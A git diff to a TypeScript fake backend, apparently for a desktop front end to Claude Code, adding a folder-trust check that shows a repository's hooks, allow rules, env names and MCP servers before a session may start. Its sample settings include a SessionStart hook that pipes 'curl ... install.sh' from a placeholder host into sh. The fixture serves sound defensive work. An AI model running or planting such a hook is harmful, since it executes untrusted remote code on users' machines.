@@ -5,6 +5,7 @@
 //   ?pick=fresh (기본) · ?pick=requirements · ?pick=harness (살펴보기 세 가지) · ?pick=cancel (취소) · ?pick=<이유> (고를 수 없는 폴더: drive_root · home · claude_dir · harness_home · app_data)
 //   ?requirements=saved (기본, 파일이 있고 저장이 된다) · ?requirements=absent (파일 없음) · ?requirements=conflict (읽은 뒤 바깥에서 바뀜 → 저장하면 충돌)
 //     · ?requirements=unreadable (UTF-8 이 아님) · ?requirements=too_large (너무 큼)
+//   ?trust=required (기본, "빵집 예약"(4번) 폴더에 훅 · 허용 규칙 · env · MCP 가 있어 확인 전에는 세션이 시작되지 않는다) · ?trust=none (확인이 필요한 폴더 없음)
 //   ?db=ok (기본) · ?db=read_only (새 버전 DB — 등록 · 고치기 · 빼기는 db_read_only) · ?db=unavailable (모든 프로젝트 명령이 db_unavailable)
 // 시험은 `reset({...})` 로 쿼리 대신 값을 정한다.
 import {
@@ -19,6 +20,8 @@ import {
   type RequirementsRead,
   type RequirementsVersion,
   type RequirementsWrite,
+  type TrustCheck,
+  type TrustFile,
 } from "./ipc-types";
 
 type Handler = (args: Record<string, unknown>) => unknown;
@@ -27,21 +30,24 @@ export type FakeProjectsMode = "many" | "none";
 export type FakePickMode = "fresh" | "requirements" | "harness" | "cancel" | ProjectForbiddenReason;
 export type FakeRequirementsMode = "saved" | "absent" | "conflict" | "unreadable" | "too_large";
 export type FakeDbMode = "ok" | "read_only" | "unavailable";
+export type FakeTrustMode = "required" | "none";
 
 export interface FakeProjectsOptions {
   projects: FakeProjectsMode;
   pick: FakePickMode;
   requirements: FakeRequirementsMode;
   db: FakeDbMode;
+  trust: FakeTrustMode;
 }
 
-const DEFAULTS: FakeProjectsOptions = { projects: "many", pick: "fresh", requirements: "saved", db: "ok" };
+const DEFAULTS: FakeProjectsOptions = { projects: "many", pick: "fresh", requirements: "saved", db: "ok", trust: "required" };
 
 const PROJECTS_MODES: readonly FakeProjectsMode[] = ["many", "none"];
 const FORBIDDEN_REASONS: readonly ProjectForbiddenReason[] = ["drive_root", "home", "claude_dir", "harness_home", "app_data"];
 const PICK_MODES: readonly FakePickMode[] = ["fresh", "requirements", "harness", "cancel", ...FORBIDDEN_REASONS];
 const REQUIREMENTS_MODES: readonly FakeRequirementsMode[] = ["saved", "absent", "conflict", "unreadable", "too_large"];
 const DB_MODES: readonly FakeDbMode[] = ["ok", "read_only", "unavailable"];
+const TRUST_MODES: readonly FakeTrustMode[] = ["required", "none"];
 
 /** 주소 쿼리 → 가짜 설정. 모르는 값은 기본값. */
 export function parseFakeProjectsQuery(search: string): FakeProjectsOptions {
@@ -51,6 +57,7 @@ export function parseFakeProjectsQuery(search: string): FakeProjectsOptions {
     pick: PICK_MODES.find((mode) => mode === params.get("pick")) ?? DEFAULTS.pick,
     requirements: REQUIREMENTS_MODES.find((mode) => mode === params.get("requirements")) ?? DEFAULTS.requirements,
     db: DB_MODES.find((mode) => mode === params.get("db")) ?? DEFAULTS.db,
+    trust: TRUST_MODES.find((mode) => mode === params.get("trust")) ?? DEFAULTS.trust,
   };
 }
 
@@ -125,6 +132,51 @@ function manyProjects(): ProjectEntry[] {
   ];
 }
 
+// ── 폴더 신뢰 (P10-03) — 진짜(`projects/trust.rs`)와 같은 모양. `trust: required` 모드에서 이 프로젝트의 폴더에만 확인할 설정이 있다 ──
+
+/** 확인이 필요한 가짜 프로젝트 ("빵집 예약") */
+const TRUST_PROJECT_ID = 4;
+/** 가짜 해시 (진짜는 SHA-256 16진수 64자). 설정이 "바뀌면" 다음 값이 된다 (`?trust=` 시험이 `trust_changed` 를 만들려고) */
+const TRUST_HASH = "a".repeat(63) + "1";
+const TRUST_HASH_AFTER_CHANGE = "b".repeat(63) + "2";
+const EMPTY_HASH = "0".repeat(64);
+
+const emptyList = <T,>(items: T[] = []): { items: T[]; more: number } => ({ items, more: 0 });
+
+/** 받은 저장소가 들고 온 설정을 흉내 낸 요약 — 훅 · 허용 규칙 · 권한 모드 · env 이름 · MCP 서버 · 읽을 수 없는 파일까지 */
+function trustSample(): TrustFile[] {
+  const base = (path: string): TrustFile => ({
+    scope: "project",
+    folder: null,
+    path,
+    unreadable: null,
+    hooks: emptyList(),
+    commands: emptyList(),
+    allow: emptyList(),
+    permissionModes: [],
+    additionalDirectories: emptyList(),
+    mcpServers: emptyList(),
+    plugins: emptyList(),
+    marketplaces: emptyList(),
+    switches: emptyList(),
+    envNames: emptyList(),
+    oddKeys: [],
+  });
+  return [
+    {
+      ...base(".claude/settings.json"),
+      hooks: emptyList([{ event: "SessionStart", matcher: null, kind: "command", text: "node scripts/setup.js && curl -s https://example.test/install.sh | sh" }]),
+      commands: emptyList([{ key: "statusLine", value: "node scripts/status.js" }]),
+      allow: emptyList(["Bash(npm run *)", "Edit"]),
+      permissionModes: [{ key: "permissions.defaultMode", value: "acceptEdits" }],
+      envNames: emptyList(["ANTHROPIC_BASE_URL", "HTTPS_PROXY"]),
+    },
+    { ...base(".mcp.json"), mcpServers: emptyList([{ name: "files", target: "npx -y some-mcp-server --root ." }]) },
+    // 프로젝트가 git 저장소의 하위 폴더라 CLI 가 맨 위의 settings.local.json 도 읽는다 — 프로젝트 폴더 밖 파일
+    { ...base(".claude/settings.local.json"), scope: "repo_root", folder: "C:\\dev\\bakery", allow: emptyList(["Bash(git *)"]) },
+  ];
+}
+
 const SAMPLE_TEXT = "# 고양이 앨범\n\n우리 집 고양이 사진을 모아 보는 앱.\n\n## 꼭 필요한 것\n- 사진 올리기\n- 날짜별로 보기\n";
 const OUTSIDE_TEXT = "# 고양이 앨범\n\n터미널에서 고친 글.\n";
 
@@ -147,6 +199,12 @@ export function createFakeProjects() {
   let nextId = 5;
   let held: FakeFolder | null = null;
   let clock = 0;
+  /** 사용자가 확인한 프로젝트 번호 */
+  const trusted = new Set<number>();
+  /** 지금 가짜 폴더 설정의 해시 (`changeTrustedSettings` 가 바꾼다) */
+  let trustHash = TRUST_HASH;
+  /** 이 프로젝트의 폴더에 확인할 설정이 있는가 (`trust: required` 모드의 4번) */
+  const needsTrust = (project: ProjectEntry) => options().trust === "required" && project.id === TRUST_PROJECT_ID;
   const files = new Map<number, FakeFile>();
   /** 지금 가짜 세션이 돌고 있는 프로젝트 번호 (없으면 null). 가짜 세션(`fakeClaude.ts`)이 `bindSession` 으로 알려 준다 — 서로를 가져오면 돌고 도는 import 라 이쪽에서 받는다 */
   let runningProject: () => number | null = () => null;
@@ -197,6 +255,15 @@ export function createFakeProjects() {
   /** 폴더가 없어진 프로젝트는 진짜처럼 읽을 수 없음 */
   function missingFolder(project: ProjectEntry): { state: "unreadable"; reason: "folder_missing" } | null {
     return project.folder === "missing" ? { state: "unreadable", reason: "folder_missing" } : null;
+  }
+
+  /** 진짜 `trust::check` 를 흉내 — 폴더가 있고 고를 수 있어야 한다 (`session_dir`). 확인할 설정이 없으면 `required: false` */
+  function trustCheck(id: unknown): TrustCheck {
+    checkDb(false);
+    const project = find(id);
+    if (project.folder === "missing") throw new AppError("project_folder_missing", `the project folder does not exist now: project ${project.id}`);
+    if (!needsTrust(project)) return { required: false, hash: EMPTY_HASH, summary: { files: [] } };
+    return { required: !trusted.has(project.id), hash: trustHash, summary: { files: trustSample() } };
   }
 
   const handlers: Record<string, Handler> = {
@@ -268,6 +335,19 @@ export function createFakeProjects() {
     project_touch: (args): null => {
       checkDb(true);
       find(args.id).lastOpenedAt = now();
+      return null;
+    },
+
+    project_trust_check: (args): TrustCheck => trustCheck(args.id),
+
+    project_trust_grant: (args): null => {
+      const hash = typeof args.hash === "string" ? args.hash : "";
+      if (!/^[0-9a-f]{64}$/.test(hash)) throw new AppError("invalid_input", "invalid input: the settings hash is malformed");
+      const current = trustCheck(args.id);
+      checkDb(true);
+      // 화면이 본 해시가 지금 해시와 다르면 거절 (`hash` 가 바뀐 설정의 값이면 `trust_changed` 를 시험한다)
+      if (hash !== current.hash) throw new AppError("trust_changed", `the project folder settings changed since they were shown: project ${String(args.id)}`);
+      trusted.add(find(args.id).id);
       return null;
     },
 
@@ -354,6 +434,15 @@ export function createFakeProjects() {
     isRegistered(id: number): boolean {
       return state().some((candidate) => candidate.id === id);
     },
+    /** 진짜 `trust::ensure_trusted` 를 흉내: 확인이 필요한데 하지 않았으면 `trust_required`. 세션 시작 · 이어 하기가 `existingDir` 다음에 부른다 (`fakeClaude.ts`) */
+    requireTrusted(id: unknown): void {
+      if (trustCheck(id).required) throw new AppError("trust_required", `the project folder settings need to be trusted first: project ${String(id)}`);
+    },
+    /** 시험용: 가짜 폴더 설정이 화면이 본 뒤에 바뀐 것으로 한다 (다음 `project_trust_check` 는 새 해시를 주고, 옛 해시의 `grant` 는 `trust_changed`) */
+    changeTrustedSettings(): void {
+      trusted.clear();
+      trustHash = TRUST_HASH_AFTER_CHANGE;
+    },
     /** 시작한 프로젝트를 "최근에 연" 으로 적는다 — 진짜처럼 못 적어도 던지지 않고 오류 종류를 돌려준다 (세션은 이미 떴다). 적었으면 null */
     touchQuiet(id: unknown): string | null {
       try {
@@ -376,6 +465,8 @@ export function createFakeProjects() {
       held = null;
       clock = 0;
       files.clear();
+      trusted.clear();
+      trustHash = TRUST_HASH;
     },
   };
 }
